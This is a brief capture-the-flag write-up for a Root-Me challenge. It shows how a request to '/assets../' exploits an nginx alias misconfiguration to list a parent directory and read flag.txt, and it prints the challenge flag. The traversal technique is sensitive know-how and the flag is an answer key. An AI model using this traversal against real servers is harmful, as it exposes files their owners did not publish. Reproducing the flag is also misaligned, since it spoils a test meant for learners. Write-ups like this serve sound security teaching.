---
layout: default
title: Nginx-Alias-Misconfiguration
---

Here, we look in the source code and can find this:
`<!--TODO: Patch /assets/ -->`, So, let's go there.

Next, we request this url: `http://challenge01.root-me.org:59092/assets../`
We get's as a repsone:
```
Index of /assets../
../
assets/                                            24-Oct-2024 12:25                   -
static/                                            24-Oct-2024 12:25                   -
flag.txt                                           04-Sep-2024 12:20                  25
```

Here is found the alias misconfigurtion. Basiccly, `/assets/` is being tranlated to `/www/var/static/`, or something like this, to keep me in the sand box. 
However, becuase I gave `/assets../`, It somehow brakes it and might take me to `/www/var`, where i can see all the files. 

Okay, let's go here: `http://challenge01.root-me.org:59092/assets../flag.txt` and view the flag, which is: `RM{4lias_M1sC0nf_HuRtS!}`

**Flag:** **_`RM{4lias_M1sC0nf_HuRtS!}`_**
